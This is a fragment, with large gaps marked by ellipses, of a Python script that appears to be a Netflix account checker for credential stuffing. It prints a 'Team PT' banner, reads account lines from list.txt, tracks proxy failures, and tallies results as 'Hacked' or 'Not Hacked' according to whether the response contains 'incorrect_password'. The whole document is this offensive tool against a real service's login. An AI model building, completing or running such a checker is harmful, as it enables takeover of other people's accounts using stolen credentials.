...
print(requests.get('http://artii.herokuapp.com/make?text=Team PT').text)
...
def netflix():
	global hits, bad, free, bad_proxy, error, p
	...
	try:
		...
		if ('incorrect_password') in r1:
			bad +=1
			print(f"\r[-] Hacked : {hits} | [-] Not Hacked : {bad} | [-] Free : {free} | [-] Error : {error} | [-] Bad Proxy : {bad_proxy}",end="")
...
for i in open("list.txt","r").read().splitlines():
	Acc = str(i)
